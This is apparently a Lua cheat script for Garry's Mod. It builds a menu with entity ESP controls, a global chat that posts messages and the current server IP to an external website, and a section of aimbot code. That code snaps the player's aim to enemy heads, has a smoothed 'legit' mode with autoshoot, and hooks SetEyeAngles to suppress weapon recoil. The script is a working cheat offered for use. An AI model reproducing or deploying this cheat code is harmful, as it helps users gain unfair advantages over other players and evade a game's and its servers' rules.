local TextEntryp = vgui.Create( "DTextEntry",lpanel5 ) -- create the form as a child of frame
TextEntryp:SetPos( 10, 120 )
TextEntryp:SetSize( 120, 30 )
TextEntryp:SetText( "Entityname" )
TextEntryp:SetFont( "menufont2" )
TextEntryp.OnChange = function( self )
	currenttext = self:GetValue()
	 // print (currenttext)
end



local Button = vgui.Create( "DButton", lpanel5)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 135, 120 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Add Entity" )
end
Button.DoClick = function()
	DermaListView:Clear()
	LocalPlayer():ConCommand ("hl_entity_esp_add ".. currenttext)
	timer.Simple (0.1, function()
	for k,v in pairs(entity_table) do
		DermaListView:AddLine(v)
	end
	end)
end




local Button = vgui.Create( "DButton", lpanel5)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 10, 160 )
Button:SetSize( 70, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Ent list" )
end
Button.DoClick = function()
 local MenuButtonOptions = DermaMenu() 
 
	for k,v in pairs(ents.GetAll()) do
		 MenuButtonOptions:AddOption(v:GetClass(), function() LocalPlayer():ConCommand ("hl_entity_esp_add "..v:GetClass()) 
		 
		 timer.Simple (0.1, function()
	for k,v in pairs(entity_table) do
		DermaListView:AddLine(v)
	end
	end)
		 end )  
	end
 

    MenuButtonOptions:Open() 
end






local Button = vgui.Create( "DButton", lpanel5)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 105, 160 )
Button:SetSize( 130, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Remove Selected" )
end
Button.DoClick = function()
	DermaListView:Clear()
	LocalPlayer():ConCommand ("hl_entity_esp_remove ".. entrm)
	timer.Simple (0.1, function()
	for k,v in pairs(entity_table) do
		DermaListView:AddLine(v)
	end
	end)
end




local Button = vgui.Create( "DButton", lpanel5)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 10, 220 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Save Entites" )
end
Button.DoClick = function()
	LocalPlayer():ConCommand ("hl_entity_esp_save")
end












local panel4 = vgui.Create( "DPanel", sheet )
panel4.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 30, 30, 30 ) ) end
sheet:AddSheet( "Social", panel4, "icon16/user_comment.png" )


local lpanel6 = vgui.Create( "DPanel",panel4)
lpanel6:SetPos( 20, 50 )
lpanel6:SetSize( 300, 340 )
lpanel6.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel6:GetWide(), lpanel6:GetTall() ) 
end

  local serveol = vgui.Create( "DLabel", panel4 )
serveol:SetPos(140, 10 )
serveol:SetSize (100)
serveol:SetFont ("menufont1")
serveol:SizeToContents() 
serveol:SetSize(Frame:GetWide(), 30)
serveol:SetText ("Chat")






/*
HTMLTest2 = vgui.Create( "HTML" ,lpanel6)
HTMLTest2:SetPos( 10, 10 )
HTMLTest2:SetSize( 280, 320 )
HTMLTest2:OpenURL( "http://darkv1lua.chatovod.com" )

*/


local DermaListView = vgui.Create("DListView",lpanel6)
DermaListView:SetPos(10, 10)
DermaListView:SetSize( 280, 260 )
DermaListView:SetMultiSelect(false)
DermaListView:AddColumn("HL scripts Global chat") 
// DermaListView:SetFont ("menufont2")
// menuopened = true 
 
 
 for k ,v in pairs (netchattable) do
	DermaListView:AddLine(v) 
 end 

timer.Create ("updatechat", 0.1,0, function()
if lpanel6:IsVisible() and oldnet  !=  netchat then 
	DermaListView:AddLine(netchat) 
end 

end)




local TextEntryp = vgui.Create( "DTextEntry",lpanel6 ) -- create the form as a child of frame
TextEntryp:SetPos( 10, 290 )
TextEntryp:SetSize( 160, 30 )
TextEntryp:SetText( "Message" )
TextEntryp:SetFont( "menufont2" )
TextEntryp.OnChange = function( self )
	curmsg = self:GetValue()
	 // print (currenttext)
end

TextEntryp.OnEnter = function( self )
	curmsg = self:GetValue()
    http.Post (websiteurl.."/hlscripts/chat_send.php", {name = LocalPlayer():Nick(), message  = curmsg })
end




local Button = vgui.Create( "DButton", lpanel6)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 200, 290 )
Button:SetSize( 80, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Send" )
end
Button.DoClick = function()
	 http.Post (websiteurl.."/hlscripts/chat_send.php", {name = LocalPlayer():Nick(), message  = curmsg })
	 DermaListView:AddLine( LocalPlayer():Nick().. ": " .. curmsg) 
end

 


  local maceol = vgui.Create( "DLabel", panel4 )
maceol:SetPos(350, 10 )
maceol:SetPos(350, 10 )
maceol:SetSize (100)
maceol:SetFont ("menufont1")
maceol:SizeToContents() 
maceol:SetSize(Frame:GetWide(), 30)
maceol:SetText ("Macros")



local Button = vgui.Create( "DButton", panel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 350,340 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Invite All" )
end
Button.DoClick = function()
	 http.Post (websiteurl.."/hlscripts/chat_send.php", {name = LocalPlayer():Nick(), message  = "I am playing on ".. game.GetIPAddress() .. " Join me!" })
	// print ("lol")
end




// update()






  local serveol7 = vgui.Create( "DLabel", panel4 )
serveol7:SetPos(500, 10 )
serveol7:SetSize (100)
serveol7:SetFont ("menufont1")
serveol7:SizeToContents() 
serveol7:SetSize(Frame:GetWide(), 30)
serveol7:SetText ("Servers With script users")






local lpanel7 = vgui.Create( "DPanel",panel4)
lpanel7:SetPos( 480, 50 )
lpanel7:SetSize( 300, 340 )
lpanel7.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel7:GetWide(), lpanel7:GetTall() ) 
end
HTMLTest2 = vgui.Create( "HTML" ,lpanel7)
HTMLTest2:SetPos( 10, 10 )
HTMLTest2:SetSize( 280, 320 )
HTMLTest2:OpenURL( websiteurl.."/hlscripts/server_list_menu.php" )





local servertext = vgui.Create( "DLabel", Frame )
servertext:SetPos(20, 500 )
servertext:SetSize (100)
servertext:SetFont ("menufont1")
servertext:SizeToContents() 
servertext:SetSize(Frame:GetWide(), 30)



local servertext2 = vgui.Create( "DLabel", Frame )
servertext2:SetPos(20, 540 )
servertext2:SetSize (100)
servertext2:SetFont ("menufont1")
servertext2:SizeToContents() 
servertext2:SetSize(Frame:GetWide(), 30)

function Frame:Think()
	if (hlusers) then 
		servertext:SetText( "Total Users: " .. table.Count (hlusers))
	end 
	//servertext2:SetText( "Total Servers: " .. table.Count (hlservers))
end 


local hllogo = vgui.Create( "DImage", Frame )
hllogo:SetPos(680, 500 )
hllogo:SetSize( 80, 80 )
hllogo:SetImage( "hl/hl.jpg", "vgui/avatar_default" )


end) 







// Extremely bad and embarrasing aimbot, replace ASAP.
// All of the shit code is beyond this point.

local hlAim = {}
hlAim.TargetMethod = {}
hlAim.Settings = {}
hlAim.TargetMethod["rage"] = false
hlAim.TargetMethod["closest"] = true
hlAim.TargetMethod["aimpoint"] = false
hlAim.Settings["sAimbone"] = "ValveBiped.Bip01_Head1"
hlAim.Settings["AimBotKey"] = KEY_E

local function HasHead(ent)
	local bone = ent:LookupBone(hlAim.Settings["sAimbone"])
	if bone then
		return true 
	else
		return false
	end
end

local function CanSeeHead(ent)
		local wishedbone  = ent:LookupBone(hlAim.Settings["sAimbone"])
		local trendpos = ent:GetBonePosition(wishedbone)
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = trendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end

local function CanSeeOBB(ent)
		local obbendpos = ent:LocalToWorld(ent:OBBCenter())
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = obbendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end

// Thank You Gravko For letting me use the base, Will be adding additional features soon

CreateClientConVar("hl_aimbot", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_friends", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_buddies", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_team", "0", false, false)

local Locked
local aimBuddies = {}


local target






local function distance_formula(vec, vec2)

    if(type(vec) != "Vector" || type(vec2) != "Vector") then
        return;
    end
    
    return (vec.z != nil && vec2.z != nil) && ((vec2.x - vec.x)^2 + (vec2.y - vec.y)^2 + (vec2.z - vec.z)^2)^1/2 || ((vec2.x - vec.x)^2 + (vec2.y - vec.y)^2)^1/2
    
end

print(distance_formula(Vector(1, 7), Vector(3, 7)))



local function hlaimbot(cmd)

if GetConVarNumber("hl_aimbot") != 1 then return end

	local AimBone
	local lpos = LocalPlayer():GetShootPos()
	

	
	
	local aimPlayers = {}
	for _, v in pairs(player.GetAll()) do
	
		table.insert(aimPlayers, v)
		
		if GetConVarNumber("hl_aimbot_ignore_team") == 1 then
			if v:Team() == LocalPlayer():Team() then
				table.RemoveByValue(aimPlayers, v)
			end
		end
		
		if GetConVarNumber("hl_aimbot_ignore_friends") == 1 then
			if v:GetFriendStatus() != "none" then
				table.RemoveByValue(aimPlayers, v)
			end
		end
		
		if v == LocalPlayer() then
			table.RemoveByValue(aimPlayers, v)
		end
		
		if !CanSeeOBB(v) then
			table.RemoveByValue(aimPlayers, v)
		end
		
		if v:Team() == TEAM_SPECTATOR then
			table.RemoveByValue(aimPlayers, v)
		end
			
	end



	
	if hlAim.TargetMethod["rage"] then
		for _, v in pairs(aimPlayers) do
			if v:Alive() then
				target = v
			end
		end
	end
	
	if hlAim.TargetMethod["closest"] then
		local allply = aimPlayers
        local plyDist = 100000
        for i = 1, #allply do
            v = allply[i]
			if v:Alive() then
            local plyDist2 = LocalPlayer():GetPos():Distance(v:GetPos())
            if plyDist2 < plyDist then
                plyDist = plyDist2
                target = v
            end
			end
		end
	end

	if hlAim.TargetMethod["aimpoint"] then
		local allply = aimPlayers
        local plyDist = 100000
        for i = 1, #allply do
            v = allply[i]
			if v:Alive() then
            local plyDist2 = LocalPlayer():GetEyeTrace().HitPos:Distance(v:GetPos())
            if plyDist2 < plyDist then
                plyDist = plyDist2
                target = v
            end
			end
		end
	end


for _, b in pairs(aimPlayers) do
	if !HasHead(target) then
		AimBone = target:LocalToWorld(target:OBBCenter())
		else
		AimBone = target:GetBonePosition(target:LookupBone("ValveBiped.Bip01_Head1"))
	end
end



	
			if input.IsKeyDown(hlAim.Settings["AimBotKey"]) then
				if GetConVarNumber("hl_aimbot_ignore_team") == 1 and target:Team() == LocalPlayer():Team() then return end
				if GetConVarNumber("hl_aimbot_ignore_friends") == 1 and target:GetFriendStatus() != "none" then return end
				if !AimBone then return end
				
				cmd:SetViewAngles((AimBone - lpos):Angle())
			end
end



cvars.AddChangeCallback("hl_aimbot", function()
        if GetConVarNumber("hl_aimbot") == 1 then
                hook.Add("CreateMove", "aimbothl", hlaimbot)
        else
                hook.Remove("aimbothl")
        end
end)


local ents = ents





local function gethead(ent)
        if ent:LookupBone("ValveBiped.Bip01_Head1") then
        local pos = ent:GetBonePosition(ent:GetHitBoxBone(0, 0))
                return pos
        end
        return ent:LocalToWorld(ent:OBBCenter())
end

CreateClientConVar ("hl_aimbot_legit", "0",false,false)
CreateClientConVar ("hl_aimbot_legit_speed", "0",true,false)
CreateClientConVar ("hl_aimbot_legit_fov", "60",true,false)
CreateClientConVar ("hl_aimbot_legit_key", "15",true,false)
CreateClientConVar ("hl_aimbot_legit_autoshoot", "0",true,false)

local function aimbot(ucmd)

        local myang = LocalPlayer():GetAngles()
		local aimbotfov = GetConVarNumber("hl_aimbot_legit_fov")
		local aimbotspeed = GetConVarNumber("hl_aimbot_legit_speed")
		// local aimbotkey_cvar = GetConVarNumber("hl_aimbot_legit_key")
		
			if input.IsKeyDown(15) or input.IsMouseDown(15) or aim == true then				
                local ply = LocalPlayer()
                local target = nil;
                for k, ent in next, player.GetAll() do
                        if (!IsValid(ent) || ent:InVehicle() || ent == LocalPlayer() || !ent:Alive() || ent:IsNPC() || ent:Team() == TEAM_SPECTATOR) then
                                continue
                        end
 
                        local ang = (ent:GetPos() - LocalPlayer():GetPos()):Angle()
                        local angdiffy = math.abs(math.NormalizeAngle(myang.y - ang.y ))
                        local angdiffp = math.abs(math.NormalizeAngle(myang.p - ang.p ))
               
                        if (angdiffy < aimbotfov and angdiffp < aimbotfov) then
                                target = ent
						surface.DrawCircle( 0, 0, aimbotfov, 0, 255, 0, 255 )
						
                        end
                end
                if (target != nil) then
					if(GetConVarNumber("hl_aimbot_legit") == 1) then
                        local angle = (gethead(target) - LocalPlayer():GetShootPos()):Angle()
                        angle.p = math.NormalizeAngle(angle.p)
                        angle.y = math.NormalizeAngle(angle.y)
                        ucmd:SetViewAngles(Lerp(aimbotspeed, ucmd:GetViewAngles(), angle))
					if(GetConVarNumber("hl_aimbot_legit_autoshoot") == 1) then
						ucmd:SetButtons(bit.bor(ucmd:GetButtons(),IN_ATTACK)) 
						timer.Simple(0.05,function()
						ucmd:RemoveKey(IN_ATTACK)
						end)
					end
					
					if(GetConVarNumber("hl_aimbot_legit") == 0) then
						hook.Remove("CreateMove", "bot", aimbot)
				end
			end
		end
	end
end
hook.Add("CreateMove", "bot", aimbot)


aimbotnorecoil_cvar = CreateClientConVar ("hl_norecoil", "1", true,false)

local pmt = FindMetaTable("Player");

local orecoil = orecoil || pmt.SetEyeAngles;

function pmt.SetEyeAngles(self, ang)
	if (aimbotnorecoil_cvar:GetBool() && string.find(string.lower(debug.getinfo(2).short_src),"/weapons/")) then
		return;
	end
	orecoil(self, ang);
end
